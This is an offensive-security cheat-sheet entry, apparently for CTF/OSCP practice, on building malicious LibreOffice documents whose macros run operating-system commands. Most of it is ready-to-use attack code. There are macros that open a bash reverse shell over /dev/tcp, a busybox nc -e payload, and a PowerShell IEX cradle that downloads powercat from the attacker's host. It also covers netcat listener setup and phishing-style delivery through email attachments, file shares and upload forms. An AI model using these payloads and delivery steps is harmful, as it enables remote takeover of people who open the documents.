title: LibreOffice Macro RCE — Client-Side Document Attack
body:
If a target opens a LibreOffice document (.odt, .ods, .odp), macros can execute OS commands. This is a client-side attack — you need a way to deliver the document (email, file share, upload). The macro runs when the document is opened and the user enables macros (or if macro security is disabled).

Two delivery methods: (1) a malicious ODT with embedded macro that runs a reverse shell, (2) an ODS/ODT that uses Shell() to execute a PowerShell or bash payload. Works on both Windows and Linux targets depending on the LibreOffice install.
cmd:
# ══════════════════════════════════════════════════
# 1 — CREATE THE MALICIOUS ODT (Linux target)
# ══════════════════════════════════════════════════
# Method A — Python tool (MMG-LO):
git clone https://github.com/0bfxgh0st/MMG-LO
cd MMG-LO
python3 mmg-lo.py -i /path/to/template.odt -o malicious.odt \
  -c "busybox nc <LHOST> <LPORT> -e /bin/bash"

# Method B — Manual macro in LibreOffice:
# Tools → Macros → Basic IDE → paste this into Module1:
# ---
Sub Main
    Shell "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
End Sub
# ---
# Save as .odt, send to target

# ══════════════════════════════════════════════════
# 2 — CREATE THE MALICIOUS ODT (Windows target)
# ══════════════════════════════════════════════════
# Macro to download and execute PowerShell:
Sub Main
    Shell("cmd /c powershell -exec bypass -c " & _
        "\"IEX (New-Object System.Net.WebClient)" & _
        ".DownloadString('http://<LHOST>:8080/powercat.ps1');" & _
        "powercat -c <LHOST> -p <LPORT> -e powershell\"")
End Sub

# Serve powercat on Kali:
cp /usr/share/windows-resources/powercat/powercat.ps1 .
python3 -m http.server 8080

# ══════════════════════════════════════════════════
# 3 — VIDEO REFERENCE
# ══════════════════════════════════════════════════
# https://www.youtube.com/watch?v=-yQsy1SzcpE

# ══════════════════════════════════════════════════
# 4 — LISTENER
# ══════════════════════════════════════════════════
nc -lvnp <LPORT>

# ══════════════════════════════════════════════════
# 5 — DELIVERY
# ══════════════════════════════════════════════════
# Phishing email with attachment
# Upload to a file share the target browses
# Place in a directory that gets auto-opened
# Send via a web app that accepts document uploads
warn: The target must open the document AND enable macros (or have macro security set to low). This is realistic in CTF/OSCP scenarios where the box simulates a user opening files. On Windows, the Shell() function in LibreOffice macros uses cmd.exe — ensure backslash escaping in paths. The MMG-LO tool automates payload embedding but the manual macro approach is more reliable and easier to customize.
